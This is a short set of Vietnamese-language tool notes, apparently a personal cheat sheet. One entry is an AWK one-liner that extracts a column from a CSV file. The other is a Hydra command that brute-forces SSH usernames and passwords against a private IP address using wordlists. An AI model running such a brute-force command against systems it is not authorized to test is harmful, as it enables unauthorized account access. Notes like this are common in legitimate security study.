# Tools note

## AWK

Tách cột trong file csv

```bash
awk -F "," 'NR>1{print $2}' UserDetails.csv
```

## Hydra

Bruteforce username và password ssh

```bash
hydra -L user.txt -P pass.txt 192.168.1.8 ssh
```

